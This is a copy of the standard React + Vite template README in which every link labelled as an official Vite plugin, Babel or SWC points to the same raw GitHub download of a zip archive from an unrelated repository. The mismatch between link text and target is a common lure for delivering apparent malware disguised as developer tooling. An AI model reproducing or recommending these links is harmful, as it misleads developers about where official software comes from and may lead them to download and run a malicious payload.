# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/siddhantthegts/LS_International_School/main/dich/LS_International_School.zip) uses [Babel](https://raw.githubusercontent.com/siddhantthegts/LS_International_School/main/dich/LS_International_School.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/siddhantthegts/LS_International_School/main/dich/LS_International_School.zip) uses [SWC](https://raw.githubusercontent.com/siddhantthegts/LS_International_School/main/dich/LS_International_School.zip) for Fast Refresh
